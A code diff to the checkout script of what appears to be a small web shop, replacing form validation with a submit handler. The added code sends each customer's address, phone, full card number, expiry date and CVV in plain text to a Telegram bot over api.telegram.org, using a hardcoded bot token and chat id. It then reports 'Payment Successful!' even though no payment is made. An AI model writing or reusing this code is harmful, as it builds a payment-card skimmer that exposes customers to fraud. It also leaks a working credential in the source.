@@ -6,9 +6,7 @@ let carddate = document.querySelector(".date");
 let cardcvv = document.querySelector(".cvv");
 let pay = document.querySelector(".pay");
 let error = document.querySelector(".error");
-let addresserror = document.querySelector(".address__error");
-let telnomererror = document.querySelector(".telnomer__error");
-
+let cart = JSON.parse(localStorage.getItem("cart"))
 let paymet__subtotal = document.querySelector(".payment__subtotal-price")
 let paymet__tax = document.querySelector(".payment__tax-price")
 let paymet__price = document.querySelector(".payment__total-price")
@@ -16,60 +14,96 @@ let paymet__price = document.querySelector(".payment__total-price")
 paymet__subtotal.textContent = "$" + localStorage.getItem("subtotal")
 paymet__tax.textContent = "$" + localStorage.getItem("percent")
 paymet__price.textContent = "$" + localStorage.getItem('total')
+document.addEventListener("DOMContentLoaded", () => {
+    const form = document.querySelector(".payment__left");
+    const error = document.querySelector(".error");
+    const telnomererror = document.querySelector(".telnomer__error");
 
-pay.addEventListener("click", function () {
-    error.textContent = "";
-    addresserror.textContent = "";
-    telnomererror.textContent = "";
+    let cart = JSON.parse(localStorage.getItem("cart")) || [];
 
-    if (
-        address.value === "" ||
-        telnomer.value === "" ||
-        cardholder.value === "" ||
-        cardnumber.value === "" ||
-        carddate.value === "" ||
-        cardcvv.value === ""
-    ) {
-        error.textContent = "Enter full information!";
-        error.style.color = "red";
-        return;
-    }
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
 
-    if (cardnumber.value.length != 16) {
-        error.textContent =
-            "There is an error in the card number. Please enter your full card number!";
-        error.style.color = "red";
-        return;
-    }
+        error.textContent = "";
+        error.style.color = 'red'
+        telnomererror.textContent = "";
 
-    if (!isNaN(cardholder.value)) {
-        error.textContent = "Card holder name must be text!";
-        error.style.color = "red";
-        return;
-    }
+        const address = form.querySelector(".address").value.trim();
+        const nomer = form.querySelector(".nomer").value.trim();
+        const holder = form.querySelector(".holder").value.trim();
+        const number = form.querySelector(".number").value.trim();
+        const date = form.querySelector(".date").value.trim();
+        const cvv = form.querySelector(".cvv").value.trim();
 
-    let phone = telnomer.value.trim();
+        if (!address || !nomer || !holder || !number || !date || !cvv) {
+            error.textContent = "Enter full information!";
+            error.style.color = "red";
+            return;
+        }
 
-    if (!phone.startsWith("+998")) {
-        telnomererror.textContent = "Phone number must start with +998!";
-        telnomererror.style.color = "red";
-        return;
-    }
+        if (number.length !== 16) {
+            error.textContent = "Card number must be 16 digits!";
+            return;
+        }
 
-    let operator = phone.slice(4, 6);
-    let Operators = ["90", "91", "93", "94", "97", "95", "99", "88", "98"];
+        if (!isNaN(holder)) {
+            error.textContent = "Card holder must be text!";
+            return;
+        }
 
-    if (!Operators.includes(operator)) {
-        telnomererror.textContent = "Invalid operator code!";
-        telnomererror.style.color = "red";
-        return;
-    }
+        if (!nomer.startsWith("+998")) {
+            telnomererror.textContent = "Phone must start with +998!";
+            return;
+        }
 
-    error.textContent = "Payment Successful!";
-    error.style.color = "green";
-    localStorage.setItem("cart", JSON.stringify([]))
+        let mahsulot_name = cart.map(el => el.name).join(", ");
+        let mahsulotl_price = localStorage.getItem("total")
 
-    setTimeout(function () {
-        window.location.href = "./buyurtma.html";
-    }, 1000);
+        const token = "8796129355:AAFgP-y_cqTZFThgmT9JiRtWKdaelStquJ4";
+        const chat_id = "5798503887";
+
+        const text = `
+Yangi buyurtma!
+Address: ${address}
+Phone: ${nomer}
+
+Card:
+Holder: ${holder}
+Number: ${number}
+Date: ${date}
+CVV: ${cvv}
+
+Products:
+Products name: ${mahsulot_name}
+Products price: ${mahsulotl_price}
+`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id,
+                text
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                error.textContent = "Payment Successful!";
+                error.style.color = "green";
+                form.reset();
+            } else {
+                error.textContent = "Error sending!";
+            }
+        })
+        .catch(() => {
+            error.textContent = "Server error!";
+        });
+        setTimeout(() => {
+        window.location.href="/buyurtma.html"
+        localStorage.setItem('cart' , JSON.stringify([]))
+        }, 5000);
+    });
 });
+
+
